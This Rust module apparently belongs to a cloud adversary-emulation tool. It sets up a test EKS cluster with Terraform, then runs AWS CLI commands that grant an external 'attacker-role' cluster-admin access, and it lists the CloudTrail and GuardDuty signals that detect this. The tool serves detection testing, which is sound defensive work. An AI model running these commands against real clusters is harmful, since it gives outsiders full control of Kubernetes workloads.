use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

const TERRAFORM: &str = r#"
terraform {
  required_providers {
    aws = { source = "hashicorp/aws", version = "~> 5.0" }
    random = { source = "hashicorp/random", version = "~> 3.0" }
  }
}

provider "aws" {}

resource "random_string" "suffix" {
  length  = 8
  special = false
  upper   = false
}

resource "aws_eks_cluster" "cluster" {
  name     = "stratus-red-team-${random_string.suffix.result}"
  role_arn = aws_iam_role.cluster.arn
  version  = "1.29"

  vpc_config {
    subnet_ids = aws_subnet.subnets[*].id
  }

  depends_on = [aws_iam_role_policy_attachment.cluster]
}

resource "aws_iam_role" "cluster" {
  name = "stratus-eks-role-${random_string.suffix.result}"
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Action = "sts:AssumeRole"
      Effect = "Allow"
      Principal = { Service = "eks.amazonaws.com" }
    }]
  })
}

resource "aws_iam_role_policy_attachment" "cluster" {
  policy_arn = "arn:aws:iam::aws:policy/AmazonEKSClusterPolicy"
  role       = aws_iam_role.cluster.name
}

data "aws_vpc" "default" { default = true }

data "aws_subnets" "default" {
  filter {
    name   = "vpc-id"
    values = [data.aws_vpc.default.id]
  }
}

resource "aws_subnet" "subnets" {
  count             = 2
  vpc_id            = data.aws_vpc.default.id
  cidr_block        = cidrsubnet(data.aws_vpc.default.cidr_block, 8, count.index + 100)
  availability_zone = data.aws_availability_zones.available.names[count.index]
}

data "aws_availability_zones" "available" { state = "available" }
data "aws_caller_identity" "current" {}
data "aws_region" "current" {}

output "cluster_name" { value = aws_eks_cluster.cluster.name }
output "aws_account_id" { value = data.aws_caller_identity.current.account_id }
output "aws_region" { value = data.aws_region.current.name }
"#;

const ATTACKER_ROLE_ARN: &str = "arn:aws:iam::012345678901:role/attacker-role";

async fn detonate_impl(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> Result<()> {
    let aws = providers.aws().await?;
    let cluster_name = outputs
        .get("cluster_name")
        .ok_or_else(|| anyhow::anyhow!("Missing output: cluster_name"))?;

    // Use AWS SDK to create EKS access entry
    // EKS API: CreateAccessEntry
    // Get AWS credentials from the providers
    let region = std::env::var("AWS_DEFAULT_REGION")
        .or_else(|_| std::env::var("AWS_REGION"))
        .unwrap_or_else(|_| "us-east-1".to_string());

    // We use aws-sdk via providers to get credentials, but since eks SDK isn't included,
    // we call the EKS REST API with the caller's credentials via STS token.
    // Get caller identity to confirm AWS access
    let identity = aws.sts
        .get_caller_identity()
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("Failed to get caller identity: {}", e))?;

    let account_id = identity.account().unwrap_or("unknown");

    // Use aws CLI as fallback since EKS SDK is not in Cargo.toml
    let output = tokio::process::Command::new("aws")
        .args([
            "eks",
            "create-access-entry",
            "--cluster-name",
            cluster_name,
            "--principal-arn",
            ATTACKER_ROLE_ARN,
            "--type",
            "STANDARD",
            "--region",
            &region,
        ])
        .output()
        .await
        .map_err(|e| anyhow::anyhow!("Failed to run aws CLI: {}", e))?;

    if output.status.success() {
        println!(
            "Created EKS access entry for '{}' on cluster '{}' (account: {}) — attacker IAM role has cluster access",
            ATTACKER_ROLE_ARN, cluster_name, account_id
        );

        // Associate cluster-admin policy
        let assoc_output = tokio::process::Command::new("aws")
            .args([
                "eks",
                "associate-access-policy",
                "--cluster-name",
                cluster_name,
                "--principal-arn",
                ATTACKER_ROLE_ARN,
                "--policy-arn",
                "arn:aws:eks::aws:cluster-access-policy/AmazonEKSClusterAdminPolicy",
                "--access-scope",
                "type=cluster",
                "--region",
                &region,
            ])
            .output()
            .await
            .map_err(|e| anyhow::anyhow!("Failed to associate access policy: {}", e))?;

        if assoc_output.status.success() {
            println!("Associated AmazonEKSClusterAdminPolicy with attacker role — cluster-admin access granted");
        } else {
            let stderr = String::from_utf8_lossy(&assoc_output.stderr);
            eprintln!("Warning: failed to associate access policy: {}", stderr);
        }
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        anyhow::bail!(
            "Failed to create EKS access entry (requires aws CLI with EKS permissions): {}",
            stderr
        );
    }

    Ok(())
}

fn detonate(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

async fn revert_impl(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> Result<()> {
    let _aws = providers.aws().await?;
    let cluster_name = outputs
        .get("cluster_name")
        .ok_or_else(|| anyhow::anyhow!("Missing output: cluster_name"))?;

    let region = std::env::var("AWS_DEFAULT_REGION")
        .or_else(|_| std::env::var("AWS_REGION"))
        .unwrap_or_else(|_| "us-east-1".to_string());

    let output = tokio::process::Command::new("aws")
        .args([
            "eks",
            "delete-access-entry",
            "--cluster-name",
            cluster_name,
            "--principal-arn",
            ATTACKER_ROLE_ARN,
            "--region",
            &region,
        ])
        .output()
        .await
        .map_err(|e| anyhow::anyhow!("Failed to run aws CLI: {}", e))?;

    if output.status.success() {
        println!(
            "Deleted EKS access entry for '{}' from cluster '{}'",
            ATTACKER_ROLE_ARN, cluster_name
        );
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        anyhow::bail!(
            "Failed to delete EKS access entry: {}",
            stderr
        );
    }

    Ok(())
}

fn revert(
    outputs: HashMap<String, String>,
    providers: Arc<CloudProviders>,
) -> BoxFuture<Result<()>> {
    Box::pin(revert_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "eks.lateral-movement.create-access-entry",
        friendly_name: "Create EKS Access Entry for External IAM Role",
        description: "Creates an EKS access entry for an attacker-controlled IAM role and associates the AmazonEKSClusterAdminPolicy, granting cluster-admin Kubernetes access to the external role.",
        detection: "CloudTrail: eks:CreateAccessEntry, eks:AssociateAccessPolicy. GuardDuty: Kubernetes threat detection: new cluster-admin IAM principal.",
        platform: Platform::Eks,
        mitre_tactics: &[MitreTactic::LateralMovement],
        is_idempotent: false,
        is_slow: true,
        prerequisite_tf: Some(TERRAFORM),
        detonate,
        revert: Some(revert),
    }
}
